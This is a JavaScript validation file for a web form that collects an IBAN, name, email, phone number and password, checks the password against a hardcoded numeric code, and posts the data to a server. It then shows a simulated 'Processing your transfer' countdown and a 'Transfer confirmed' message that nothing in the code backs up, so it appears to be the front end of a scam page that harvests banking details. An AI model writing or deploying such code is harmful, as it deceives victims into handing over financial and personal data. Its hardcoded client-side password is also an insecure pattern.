/**
 * /js/validation.js
 * Form field validation
 */

document.addEventListener('DOMContentLoaded', function() {
    // IBAN validation
    const ibanInput = document.getElementById('iban');
    if (ibanInput) {
        ibanInput.addEventListener('input', function() {
            const iban = this.value.toUpperCase().replace(/\s/g, '');
            this.value = iban;
            
            // Basic validation (base format)
            const ibanPattern = /^[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}$/;
            
            if (iban && !ibanPattern.test(iban)) {
                this.setCustomValidity('Invalid IBAN format. Example: FR7630006000011234567890189');
            } else {
                this.setCustomValidity('');
            }
        });
    }
    
    // Email validation
    const emailInput = document.getElementById('email');
    if (emailInput) {
        emailInput.addEventListener('input', function() {
            const email = this.value;
            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            
            if (email && !emailPattern.test(email)) {
                this.setCustomValidity('Invalid email format');
            } else {
                this.setCustomValidity('');
            }
        });
    }
    
    // Phone validation
    const telInput = document.getElementById('telephone');
    if (telInput) {
        telInput.addEventListener('input', function() {
            // Remove all non-numeric characters
            const phoneNumber = this.value.replace(/\D/g, '');
            this.value = phoneNumber;
            
            if (phoneNumber && (phoneNumber.length < 10 || phoneNumber.length > 15)) {
                this.setCustomValidity('Phone number must contain between 10 and 15 digits');
            } else {
                this.setCustomValidity('');
            }
        });
    }
    
    // Password validation
    const passwordInput = document.getElementById('password');
    const passwordErrorModal = document.getElementById('password-error-modal');
    const retryPasswordBtn = document.getElementById('retry-password');
    
    if (passwordInput && passwordErrorModal) {
        // Required specific password
        const requiredPassword = "6769832548566125";
        
        // Close password error modal event
        const closePassBtns = passwordErrorModal.querySelectorAll('.close');
        closePassBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                passwordErrorModal.style.display = 'none';
            });
        });
        
        // Retry with password
        if (retryPasswordBtn) {
            retryPasswordBtn.addEventListener('click', function() {
                passwordErrorModal.style.display = 'none';
                passwordInput.focus();
            });
        }
        
        // Close modal when clicking outside
        window.addEventListener('click', function(event) {
            if (event.target === passwordErrorModal) {
                passwordErrorModal.style.display = 'none';
            }
        });
    }
    
    // Complete form validation
    const transferForm = document.getElementById('transfer-form');
    if (transferForm) {
        transferForm.addEventListener('submit', function(event) {
            event.preventDefault();
            
            // Additional client-side validation before submission
            const iban = ibanInput.value.toUpperCase().replace(/\s/g, '');
            const ibanPattern = /^[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}$/;
            
            if (!ibanPattern.test(iban)) {
                alert('Invalid IBAN format.');
                return false;
            }
            
            const email = emailInput.value;
            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            
            if (!emailPattern.test(email)) {
                alert('Invalid email format.');
                return false;
            }
            
            const phoneNumber = telInput.value.replace(/\D/g, '');
            if (phoneNumber.length < 10 || phoneNumber.length > 15) {
                alert('Phone number must contain between 10 and 15 digits.');
                return false;
            }
            
            // Password verification
            const password = passwordInput.value;
            const requiredPassword = "6769832548566125";
            
            if (password !== requiredPassword) {
                passwordErrorModal.style.display = 'block';
                return false;
            }
            
            // If everything is valid, submit the form
            const formData = {
                iban: iban,
                nom: document.getElementById('nom').value,
                prenom: document.getElementById('prenom').value,
                email: email,
                telephone: phoneNumber,
                password: password
            };
            
            // Send data to server
            fetch('/submit_form', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData),
            })
            .then(response => response.json())
            .then(data => {
                // Close form modal
                document.getElementById('iban-modal').style.display = 'none';
                
                // Show loading animation
                const loadingModal = document.getElementById('loading-modal');
                const loadingText = document.getElementById('loading-text');
                
                loadingModal.style.display = 'block';
                
                let countdown = 5;
                loadingText.textContent = `Processing your transfer... (${countdown})`;
                
                const timer = setInterval(() => {
                    countdown--;
                    loadingText.textContent = `Processing your transfer... (${countdown})`;
                    
                    if (countdown <= 0) {
                        clearInterval(timer);
                        loadingText.textContent = "Transfer confirmed! A validation code has been sent to your phone.";
                        
                        // Redirect to home page after a short delay
                        setTimeout(() => {
                            window.location.href = '/';
                        }, 2000);
                    }
                }, 1000);
            })
            .catch(error => {
                console.error('Error during form submission:', error);
                alert('An error occurred. Please try again.');
            });
        });
    }
});